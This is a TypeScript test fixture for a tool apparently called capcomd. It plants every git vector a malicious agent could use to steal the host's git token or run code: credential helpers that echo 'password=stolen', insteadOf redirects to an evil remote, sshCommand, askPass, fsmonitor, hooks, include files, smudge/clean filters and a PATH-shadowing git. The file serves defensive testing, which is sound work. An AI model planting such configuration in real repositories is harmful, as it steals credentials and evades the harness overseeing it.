// What a malicious agent plants in its checkout and HOME to get capcomd's git token or run a command where it is
// (tests/unit/host-git-credentials.test.ts). Every planted command records the env it ran with in `leak`.
import { chmodSync, mkdirSync, writeFileSync } from "fs";
import { join } from "path";
import { Git } from "../../src/merge/git";

/** A script that records its env (the token, if it had it) and exits `code`. */
export function spy(dir: string, name: string, code = 0, extra = ""): string {
  const p = join(dir, `${name}.sh`);
  writeFileSync(p, `#!/bin/sh\nenv > "${dir}/${name}.$$.env"\n${extra}\nexit ${code}\n`);
  chmodSync(p, 0o755);
  return p;
}

/**
 * Every vector at once, in `checkout` (its .git/config, hooks, a filter) and `home` (a .gitconfig and a `git` on PATH):
 * credential helpers (plain and URL-scoped), url.insteadOf / pushInsteadOf, a push URL to the evil repository,
 * core.sshCommand, core.askPass, core.fsmonitor, core.hooksPath, include.path, includeIf, http.proxy, remote
 * upload/receive packs, pre-push and reference-transaction hooks, a clean/smudge filter on every file.
 */
export async function plant(checkout: string, home: string, leak: string, evil: string, remote: string) {
  const g = new Git(checkout);
  const set = (k: string, v: string) => g.ok(["config", "--add", k, v]);
  const helper = spy(leak, "helper", 0, "echo username=x; echo password=stolen");
  await set("credential.helper", `!${helper}`);
  await set(`credential.${remote}.helper`, `!${helper}`);
  await set("credential.https://github.com.helper", `!${helper}`);
  await set(`url.${evil}.insteadOf`, remote);
  await set(`url.${evil}.pushInsteadOf`, remote);
  await g.ok(["remote", "set-url", "--push", "origin", evil]);
  await set("core.sshCommand", spy(leak, "ssh", 1));
  await set("core.askPass", spy(leak, "askpass"));
  await set("core.fsmonitor", spy(leak, "fsmonitor"));
  const hooks = join(leak, "hooks");
  mkdirSync(hooks, { recursive: true });
  for (const h of ["pre-push", "reference-transaction", "post-checkout", "pre-commit"]) { writeFileSync(join(hooks, h), `#!/bin/sh\nenv > "${leak}/hook-${h}.$$.env"\nexit 0\n`); chmodSync(join(hooks, h), 0o755); }
  await set("core.hooksPath", hooks);
  for (const h of ["pre-push", "reference-transaction"]) { writeFileSync(join(checkout, ".git", "hooks", h), `#!/bin/sh\nenv > "${leak}/githook-${h}.$$.env"\nexit 0\n`); chmodSync(join(checkout, ".git", "hooks", h), 0o755); }
  const inc = join(leak, "included.gitconfig");
  writeFileSync(inc, `[credential]\n\thelper = !${spy(leak, "included-helper")}\n[url "${evil}"]\n\tpushInsteadOf = ${remote}\n`);
  await set("include.path", inc);
  await set(`includeIf.gitdir:${checkout}/.path`, inc);
  await set("http.proxy", "http://127.0.0.1:9/");
  await set("remote.origin.receivepack", spy(leak, "receivepack", 1));
  await set("remote.origin.uploadpack", spy(leak, "uploadpack", 1));
  await set("filter.evil.clean", spy(leak, "clean", 0, "cat"));
  await set("filter.evil.smudge", spy(leak, "smudge", 0, "cat"));
  mkdirSync(join(checkout, ".git", "info"), { recursive: true });
  writeFileSync(join(checkout, ".git", "info", "attributes"), "* filter=evil\n");
  // The agent's HOME and PATH: a global .gitconfig with the same, and a `git` that records its env first.
  mkdirSync(home, { recursive: true });
  writeFileSync(join(home, ".gitconfig"), `[credential]\n\thelper = !${helper}\n[url "${evil}"]\n\tinsteadOf = ${remote}\n\tpushInsteadOf = ${remote}\n[include]\n\tpath = ${inc}\n`);
  const bin = join(home, "npm", "bin");
  mkdirSync(bin, { recursive: true });
  writeFileSync(join(bin, "git"), `#!/bin/sh\nenv > "${leak}/path-git.$$.env"\nPATH=$(echo "$PATH" | sed "s#${bin}:##") exec git "$@"\n`);
  chmodSync(join(bin, "git"), 0o755);
}
